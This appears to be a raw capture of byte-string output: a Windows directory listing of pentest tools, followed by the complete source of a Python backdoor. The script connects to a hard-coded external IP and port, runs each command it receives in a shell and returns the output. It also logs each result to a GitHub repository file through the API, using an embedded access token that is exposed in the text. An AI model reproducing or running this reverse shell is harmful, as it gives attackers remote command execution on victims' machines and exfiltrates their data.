

b'bot\n'.
b'$RECYCLE.BIN\nASCII-Table-wide.svg.webp\nBurp Suite Community Edition.lnk\nGDUT-Schedule-ng\nGopherus-master\nHDT\xe7\x82\x89\xe7\x9f\xb3\xe5\x9b\xa2\xe5\xad\x90\xe7\x89\x88\nLX Music.lnk\nPanDownload_\xe5\x85\xac\xe6\xb5\x8b\xe7\x89\x88_0.1.3_ALL (1)\nREADME.md\nSystem Volume Information\nVMware Workstation 16 Player.lnk\nantSword2022\nctfshow\ndesktop.ini\ndirmap-master\ndvcs-ripper-master\ngoby-win-x64-2.3.0\ninfosec\nkali-linux-2023.1-vmware-amd64.vmwarevm\npayload.txt\nphp\nphp disable\xe9\x80\x9a\xe6\x9d\x80\nphpstudy_pro.lnk\nsend.py\nsqlmapproject-sqlmap-aacb360\nvulfocus\nvulfocus - \xe5\x89\xaf\xe6\x9c\xac\n~$\xe7\xba\xbf\xe6\x80\xa7\xe4\xbb\xa3\xe6\x95\xb0\xe7\xad\x94\xe6\xa1\x88.docx\n\xe4\xb9\xa6\n\xe5\x85\xb6\xe4\xbb\x96\n\xe5\x93\xa5\xe6\x96\xaf\xe6\x8b\x89\n\xe5\xad\xa6\xe4\xb9\xa0\xe8\xb5\x84\xe6\x96\x99\n\xe6\x89\x8b\xe5\x86\x8c\n\xe7\xae\x97\xe6\xb3\x95\xe8\xaf\xbe\xe4\xbb\xb6\xe5\x85\xa8\xe5\x90\x88\xe9\x9b\x86\n\xe8\x80\x83\xe6\xa0\xb8.md\n'.
b"import socket\r\nimport subprocess\r\nimport base64\r\nimport requests\r\n\r\nHOST = '43.138.184.24'\r\nPORT = 8899\r\n\r\nusername = 'laggurito'\r\nrepo = 'vulhub'\r\nfile_path = 'README.md'\r\naccess_token = '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'\r\n\r\napi_url = f'https://api.github.com/repos/laggurito/vulhub/contents/cc'\r\n\r\nheaders = {'Authorization': f'token {access_token}'}\r\n\r\n\r\ndef execute_command(command):\r\n    try:\r\n        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\r\n        stdout, stderr = process.communicate()\r\n\r\n        result = stdout + stderr\r\n\r\n        # \xe5\xa6\x82\xe6\x9e\x9c\xe6\xb2\xa1\xe6\x9c\x89\xe8\xbe\x93\xe5\x87\xba\xef\xbc\x8c\xe8\xbf\x94\xe5\x9b\x9e\xe4\xb8\x80\xe4\xb8\xaa\xe7\xa1\xae\xe8\xae\xa4\xe6\xb6\x88\xe6\x81\xaf\r\n        if not result:\r\n            result = '{} \xe6\x88\x90\xe5\x8a\x9f\xe6\x89\xa7\xe8\xa1\x8c.'.format(command).encode()\r\n        return result\r\n    except Exception as e:\r\n        return str(e).encode()\r\n\r\nwith socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\r\n    s.connect((HOST, PORT))\r\n\r\n    while True:\r\n        data = s.recv(1024)\r\n        command = data.decode().strip()\r\n        print(command)\r\n\r\n        if command == 'exit':\r\n            s.close()\r\n            break\r\n\r\n        result = execute_command(command)\r\n#--------\r\n        response = requests.get(api_url, headers=headers)\r\n        if response.status_code == 200:\r\n            file_info = response.json()\r\n            sha = file_info['sha']\r\n            content = base64.b64decode(file_info['content']).decode()\r\n\r\n            # \xe4\xbf\xae\xe6\x94\xb9\xe6\x96\x87\xe4\xbb\xb6\xe5\x86\x85\xe5\xae\xb9\r\n            new_content = content + f'\\n{result}.'\r\n            print(new_content)\r\n            new_content_encoded = base64.b64encode(new_content.encode()).decode()\r\n\r\n            # \xe6\x8f\x90\xe4\xba\xa4\xe6\x9b\xb4\xe6\x94\xb9\r\n            commit_message = 'Update file content using GitHub API'\r\n            payload = {\r\n                'message': commit_message,\r\n                'content': new_content_encoded,\r\n                'sha': sha,\r\n            }\r\n            response = requests.put(api_url, headers=headers, json=payload)\r\n\r\n            if response.status_code == 200:\r\n                print('File updated successfully.')\r\n            else:\r\n                print(f'Error updating file: {response.status_code} - {response.text}')\r\n        else:\r\n            print(f'Error getting file info: {response.status_code} - {response.text}')\r\n#----------\r\n\r\n        s.sendall(result)\r\n".